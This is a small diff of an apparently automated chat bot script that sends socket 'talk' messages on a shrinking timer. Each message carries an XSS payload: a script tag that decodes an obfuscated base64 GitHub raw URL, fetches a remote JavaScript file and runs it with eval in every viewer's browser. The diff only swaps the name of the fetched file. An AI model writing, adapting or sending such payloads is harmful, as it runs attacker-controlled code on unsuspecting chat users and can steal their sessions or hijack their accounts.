@@ -40,7 +40,7 @@ const intervalId = setInterval(function() {
         }, 100)
     }, 1000)
     socket.emit('talk', {
-        text: "SEVENSEVENSEVEN777 <script>fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'777SPRE'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script>"
+        text: "SEVENSEVENSEVEN777 <script>fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'777SP'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script>"
     });
     coughtimer = coughtimer - 125;
 }, coughtimer);
